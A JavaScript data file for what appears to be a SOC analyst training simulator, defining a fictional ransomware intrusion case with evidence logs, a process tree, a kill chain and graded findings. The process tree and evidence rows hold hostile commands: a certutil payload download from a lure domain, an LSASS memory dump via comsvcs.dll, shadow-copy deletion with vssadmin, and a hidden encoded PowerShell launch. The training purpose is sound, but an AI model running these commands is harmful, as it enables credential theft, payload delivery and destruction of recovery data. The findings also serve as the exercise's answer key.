// ============================================================
// SOC TRAINER v4 — Structured Case Data
// Powers the Investigation Board: every diagram, pivot and
// finding reads from these objects. Ransomware = deep showcase.
// ============================================================

// risk → color token
export const RISK = {
  critical: "var(--red)", high: "var(--orange)", med: "var(--amber)",
  low: "var(--cyan)", clean: "var(--green)", unknown: "var(--t3)",
};
export const ENTITY_ICON = {
  host: '<rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/>',
  user: '<circle cx="12" cy="8" r="4"/><path d="M4 21v-1a6 6 0 016-6h4a6 6 0 016 6v1"/>',
  ip: '<circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 010 18M12 3a14 14 0 000 18"/>',
  domain: '<circle cx="12" cy="12" r="9"/><path d="M3 12h18"/><path d="M12 3c2.5 2.5 4 5.5 4 9s-1.5 6.5-4 9c-2.5-2.5-4-5.5-4-9s1.5-6.5 4-9z"/>',
  file: '<path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6"/>',
  account: '<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>',
};

// ─── SHOWCASE: RANSOMWARE — "Operation Crimson Ledger" ───────
const ransomware = {
  id: "ransomware",
  codename: "CRIMSON LEDGER",
  title: "Ransomware Pre-Encryption · FIN-DB-03",
  org: "Meridian Financial Group",
  summary: "CrowdStrike Falcon fired on FIN-DB-03 after vssadmin wiped all shadow copies and an unsigned binary began writing to 32 SMB shares — classic pre-encryption staging on the live payroll database. Your job: reconstruct how they got in, what they touched, and whether data left before you contain.",
  brief: "It's 09:15. Payday processing runs in 18 hours. A legal hold forbids wipe-and-reimage before evidence is preserved. The CFO wants updates every 30 minutes. Work the board, confirm the findings, then write your response.",
  severity: { score: "9.1", label: "CRITICAL", frac: .91, color: "var(--red)" },
  stats: [
    { k: "Dwell time", v: "06:06:26", i: "var(--orange)" },
    { k: "Hosts touched", v: "4", i: "var(--red)" },
    { k: "Shares hit", v: "32", i: "var(--orange)" },
    { k: "Patient zero", v: "WKS-RIVERA", i: "var(--cyan)" },
  ],

  entities: [
    { id: "wks", type: "host", label: "WKS-RIVERA", sub: "Finance workstation", risk: "critical", meta: { os: "Win11 23H2", ip: "10.20.4.57", note: "Patient zero — first execution" } },
    { id: "findb", type: "host", label: "FIN-DB-03", sub: "Payroll database", risk: "critical", meta: { os: "Win Server 2019", ip: "10.20.9.13", note: "Detonation target · legal hold" } },
    { id: "filesrv", type: "host", label: "FILE-SRV-01", sub: "Departmental shares", risk: "high", meta: { os: "Win Server 2019", ip: "10.20.9.21", note: "32 shares written" } },
    { id: "dc", type: "host", label: "DC-01", sub: "Domain controller", risk: "med", meta: { os: "Win Server 2022", ip: "10.20.9.2", note: "Auth source — verify Kerberos" } },
    { id: "rivera", type: "user", label: "a.rivera", sub: "Payroll Analyst", risk: "high", meta: { dept: "Finance", note: "Opened the phishing attachment" } },
    { id: "svcbackup", type: "account", label: "svc_backup", sub: "Service account", risk: "critical", meta: { priv: "Local admin on 9 hosts", note: "Creds dumped from LSASS — lateral pivot" } },
    { id: "c2ip", type: "ip", label: "185.220.101.47", sub: "C2 · :443", risk: "critical", meta: { geo: "Bulletproof / RU", vt: "62 / 94", note: "60s-jitter beacon, 6h" } },
    { id: "c2dom", type: "domain", label: "payroll-update[.]net", sub: "Lure / C2 domain", risk: "critical", meta: { reg: "4 days ago", vt: "malware", note: "Used in phishing + C2" } },
    { id: "dropper", type: "file", label: "svchost32.exe", sub: "Dropper · unsigned", risk: "critical", meta: { path: "C:\\Windows\\Temp\\", sha: "a3f5c9…b9e2", note: "Masquerades as svchost" } },
    { id: "runkey", type: "file", label: "HKCU\\…\\Run\\WinUpd", sub: "Persistence", risk: "high", meta: { note: "Auto-run dropper at logon" } },
  ],

  // nested process tree (WKS-RIVERA)
  processTree: {
    pid: 4102, name: "outlook.exe", args: "", signed: true,
    children: [{
      pid: 5210, name: "WINWORD.EXE", args: "/n payroll_update_Q4.docm", signed: true, technique: "T1204.002",
      children: [{
        pid: 5544, name: "cmd.exe", args: "/c certutil -urlcache -f http://payroll-update[.]net/s …", signed: true, bad: true, technique: "T1105",
        children: [{
          pid: 6012, name: "svchost32.exe", args: "C:\\Windows\\Temp\\", signed: false, bad: true, technique: "T1036.005",
          children: [
            { pid: 6240, name: "powershell.exe", args: "-nop -w hidden -enc SQBFAFgA…", signed: true, bad: true, technique: "T1059.001",
              children: [
                { pid: 6388, name: "rundll32.exe", args: "comsvcs.dll MiniDump 600 lsass.dmp", signed: true, bad: true, technique: "T1003.001" },
                { pid: 6402, name: "vssadmin.exe", args: "delete shadows /all /quiet", signed: true, bad: true, technique: "T1490" },
              ] },
          ],
        }],
      }],
    }],
  },

  // attack chain (kill-chain ordered)
  attackChain: [
    { stage: "Initial Access", technique: "T1566.001", title: "Spear-phish attachment", detail: "Email 'Q4 payroll update' with a macro-enabled .docm delivered to a.rivera.", status: "confirmed", entityIds: ["rivera", "c2dom"] },
    { stage: "Execution", technique: "T1204.002", title: "User opens macro doc", detail: "WINWORD spawns cmd → certutil pulls the dropper from payroll-update[.]net.", status: "confirmed", entityIds: ["wks", "dropper"] },
    { stage: "Persistence", technique: "T1547.001", title: "Run key + service", detail: "WinUpd Run key and a 7045 service install survive reboot.", status: "confirmed", entityIds: ["runkey", "dropper"] },
    { stage: "C2", technique: "T1071.001", title: "HTTPS beacon", detail: "svchost32 beacons to 185.220.101.47:443, 60s jitter, for ~6 hours.", status: "confirmed", entityIds: ["c2ip", "dropper"] },
    { stage: "Credential Access", technique: "T1003.001", title: "LSASS memory dump", detail: "comsvcs.dll MiniDump harvests svc_backup credentials.", status: "confirmed", entityIds: ["svcbackup", "wks"] },
    { stage: "Lateral Movement", technique: "T1021.002", title: "SMB to servers", detail: "svc_backup authenticates to FILE-SRV-01 and FIN-DB-03 over SMB.", status: "confirmed", entityIds: ["svcbackup", "filesrv", "findb"] },
    { stage: "Defense Evasion", technique: "T1070.001", title: "Clear event logs", detail: "Security log cleared (Event 1102) one minute before impact.", status: "confirmed", entityIds: ["findb"] },
    { stage: "Impact", technique: "T1490", title: "Inhibit recovery", detail: "vssadmin deletes all shadow copies on FIN-DB-03.", status: "confirmed", entityIds: ["findb"] },
    { stage: "Impact", technique: "T1486", title: "Pre-encryption staging", detail: "Unsigned binary writes to 32 SMB shares — encryption imminent.", status: "suspected", entityIds: ["filesrv", "findb"] },
    { stage: "Exfiltration?", technique: "T1567", title: "Possible exfil", detail: "Outbound volume spike before staging — exfil UNCONFIRMED. Investigate.", status: "unknown", entityIds: ["c2ip"] },
  ],

  // network / lateral map
  network: {
    zones: [
      { id: "internet", label: "INTERNET", x: 50, color: "var(--red)" },
      { id: "corp", label: "CORP LAN", x: 300, color: "var(--cyan)" },
      { id: "server", label: "SERVER VLAN", x: 560, color: "var(--orange)" },
    ],
    nodes: [
      { id: "c2", entity: "c2ip", label: "185.220.101.47", zone: "internet", y: 150, compromised: true, kind: "ip" },
      { id: "nwks", entity: "wks", label: "WKS-RIVERA", zone: "corp", y: 90, compromised: true, kind: "host" },
      { id: "nuser", entity: "rivera", label: "a.rivera", zone: "corp", y: 220, compromised: false, kind: "user" },
      { id: "ndc", entity: "dc", label: "DC-01", zone: "server", y: 60, compromised: false, kind: "host" },
      { id: "nfile", entity: "filesrv", label: "FILE-SRV-01", zone: "server", y: 150, compromised: true, kind: "host" },
      { id: "nfindb", entity: "findb", label: "FIN-DB-03", zone: "server", y: 245, compromised: true, kind: "host" },
    ],
    edges: [
      { from: "c2", to: "nwks", label: "C2 :443", malicious: true },
      { from: "nwks", to: "ndc", label: "Kerberos auth", malicious: false },
      { from: "nwks", to: "nfile", label: "SMB · svc_backup", malicious: true },
      { from: "nwks", to: "nfindb", label: "SMB · svc_backup", malicious: true },
      { from: "nfindb", to: "nfile", label: "32 shares", malicious: true },
    ],
  },

  // evidence log — the raw material; rows pivot by entity & confirm findings
  evidence: [
    { id: "e1", time: "03:08:44", source: "Proofpoint", host: "—", event: "MAIL", detail: "Inbound mail 'Q4 Payroll Update' → a.rivera, attachment payroll_update_Q4.docm", iocs: ["c2dom", "rivera"], sev: "o", finding: "f1" },
    { id: "e2", time: "03:11:20", source: "Sysmon", host: "wks", event: "1", detail: "WINWORD.EXE spawned cmd.exe /c certutil -urlcache -f http://payroll-update[.]net/s.exe", iocs: ["wks", "c2dom"], sev: "r", finding: "f1" },
    { id: "e3", time: "03:11:58", source: "Sysmon", host: "wks", event: "11", detail: "File created C:\\Windows\\Temp\\svchost32.exe (unsigned, SHA256 a3f5c9…b9e2)", iocs: ["wks", "dropper"], sev: "r", finding: "f1" },
    { id: "e4", time: "03:12:30", source: "Firewall", host: "wks", event: "ALLOW", detail: "Outbound TLS 10.20.4.57 → 185.220.101.47:443, periodic 60s ± jitter", iocs: ["wks", "c2ip"], sev: "r", finding: "f2" },
    { id: "e5", time: "03:14:02", source: "Sysmon", host: "wks", event: "13", detail: "Registry set HKCU\\…\\Run\\WinUpd = C:\\Windows\\Temp\\svchost32.exe", iocs: ["wks", "runkey"], sev: "o", finding: "f3" },
    { id: "e6", time: "03:14:09", source: "Windows", host: "wks", event: "7045", detail: "Service installed: 'WinUpd' imagePath = svchost32.exe, start=auto", iocs: ["wks", "dropper"], sev: "o", finding: "f3" },
    { id: "e7", time: "05:40:12", source: "EDR", host: "wks", event: "DETECT", detail: "rundll32 comsvcs.dll MiniDump 600 lsass.dmp — credential theft", iocs: ["wks", "svcbackup"], sev: "r", finding: "f4" },
    { id: "e8", time: "06:51:03", source: "Sysmon", host: "wks", event: "3", detail: "net view / share enumeration across SERVER VLAN", iocs: ["wks"], sev: "a", finding: null },
    { id: "e9", time: "08:30:00", source: "Windows", host: "filesrv", event: "4624", detail: "Logon type 3 (network) by svc_backup from 10.20.4.57 — off-hours, anomalous", iocs: ["svcbackup", "filesrv"], sev: "r", finding: "f5" },
    { id: "e10", time: "08:31:47", source: "Windows", host: "findb", event: "4624", detail: "Logon type 3 by svc_backup from 10.20.4.57 to FIN-DB-03", iocs: ["svcbackup", "findb"], sev: "r", finding: "f5" },
    { id: "e11", time: "09:02:15", source: "Firewall", host: "findb", event: "ALLOW", detail: "Outbound 2.4 GB 10.20.9.13 → 185.220.101.47 over 9 min — possible exfil", iocs: ["findb", "c2ip"], sev: "r", finding: "f6" },
    { id: "e12", time: "09:13:22", source: "Windows", host: "findb", event: "1102", detail: "Security audit log CLEARED on FIN-DB-03", iocs: ["findb"], sev: "r", finding: "f7" },
    { id: "e13", time: "09:14:22", source: "EDR", host: "findb", event: "DETECT", detail: "vssadmin.exe delete shadows /all /quiet — shadow copies destroyed", iocs: ["findb"], sev: "r", finding: "f8" },
    { id: "e14", time: "09:14:50", source: "EDR", host: "filesrv", event: "DETECT", detail: "Unsigned process writing encrypted blobs to 32 SMB shares", iocs: ["filesrv", "findb"], sev: "r", finding: "f8" },
    { id: "e15", time: "09:15:10", source: "Falcon", host: "findb", event: "ALERT", detail: "SuspiciousVssAdminActivity — incident raised CS-90412-A", iocs: ["findb"], sev: "r", finding: null },
  ],

  // findings = the investigative objectives. Confirm by selecting the right evidence.
  findings: [
    { id: "f1", q: "How did the attacker get in?", answer: "Spear-phishing email with a macro-enabled Word doc opened by a.rivera, which pulled svchost32.exe from payroll-update[.]net.", category: "Initial Access", evidence: ["e1", "e2", "e3"], xp: 15 },
    { id: "f2", q: "How is the malware calling home?", answer: "HTTPS beacon to 185.220.101.47:443 with ~60s jitter, active for roughly 6 hours.", category: "Command & Control", evidence: ["e4"], xp: 10 },
    { id: "f3", q: "How does it survive a reboot?", answer: "A 'WinUpd' Run key and a matching 7045 service both auto-launch the dropper.", category: "Persistence", evidence: ["e5", "e6"], xp: 10 },
    { id: "f4", q: "How did they escalate / move?", answer: "LSASS was dumped via comsvcs.dll, harvesting svc_backup — a local admin on 9 hosts.", category: "Credential Access", evidence: ["e7"], xp: 15 },
    { id: "f5", q: "Which other hosts are compromised?", answer: "svc_backup authenticated (type 3) to FILE-SRV-01 and FIN-DB-03 — both in scope.", category: "Lateral Movement", evidence: ["e9", "e10"], xp: 15 },
    { id: "f6", q: "Did data leave before encryption?", answer: "Yes — a 2.4 GB outbound transfer from FIN-DB-03 to the C2 precedes staging. Treat as a breach (exfil), not just ransomware.", category: "Exfiltration", evidence: ["e11"], xp: 20 },
    { id: "f7", q: "Did they try to hide?", answer: "The Security audit log on FIN-DB-03 was cleared (Event 1102) one minute before impact.", category: "Defense Evasion", evidence: ["e12"], xp: 10 },
    { id: "f8", q: "What's the impact right now?", answer: "Shadow copies deleted (recovery inhibited) and pre-encryption writes to 32 shares — encryption is imminent.", category: "Impact", evidence: ["e13", "e14"], xp: 15 },
  ],
};

// ─── Compact-but-complete cases for the other classes ────────
import { CASES_EXTRA } from "./case-data-2.js";

export const CASES = { ransomware, ...CASES_EXTRA };

// helper: find entity by id within a case
export function entityById(thecase, id) {
  return thecase.entities.find((e) => e.id === id);
}
